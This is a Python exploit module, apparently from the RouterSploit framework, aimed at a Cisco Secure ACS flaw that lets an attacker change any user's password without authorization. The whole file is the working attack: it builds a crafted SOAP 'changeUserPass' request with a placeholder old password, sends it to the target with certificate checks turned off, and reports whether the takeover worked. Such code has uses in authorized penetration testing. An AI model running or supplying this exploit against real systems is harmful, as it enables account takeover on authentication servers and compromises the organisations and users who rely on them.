# rsf exploit module
# description: Module exploits Cisco Secure ACS unauthorized password change vulnerability which allows changing passwords for any user.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 443
        self.path = "/PI/services/UCP/"
        self.username = ""
        self.password = ""

    def run(self):
        headers = {'SOAPAction': '"changeUserPass"'}
        
        data = ('<?xml version="1.0" encoding="utf-8"?>' + '\r\n'
                '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
                'xmlns:xsd="http://www.w3.org/1999/XMLSchema">' + '\r\n'
                '<SOAP-ENV:Body>' + '\r\n'
                '<ns1:changeUserPass xmlns:ns1="UCP" SOAP-ENC:root="1">' + '\r\n'
                '<v1 xsi:type="xsd:string">' + self.username + '</v1>' + '\r\n'
                '<v2 xsi:type="xsd:string">fakepassword</v2>' + '\r\n'
                '<v3 xsi:type="xsd:string">' + self.password + '</v3>' + '\r\n'
                '</ns1:changeUserPass>'
                '</SOAP-ENV:Body>' + '\r\n'
                '</SOAP-ENV:Envelope>' + '\r\n\r\n')

        print(f"[*] Changing password for {self.username}")
        
        try:
            response = requests.post(
                f"https://{self.target}:{self.port}{self.path}",
                data=data,
                headers=headers,
                verify=False
            )
            
            if not response:
                print("[-] No response from target")
                return
                
            if "success" in response.text:
                print(f"[+] Password changed to {self.password}")
            elif "Password has already been used" in response.text:
                print("[-] Password has already been used")
            elif "Invalid credentials for user" in response.text:
                print("[-] Invalid username or target not vulnerable")
            else:
                print("[-] Unknown error occurred")
        except Exception as e:
            print(f"[-] Error: {str(e)}")

    def check(self):
        return None
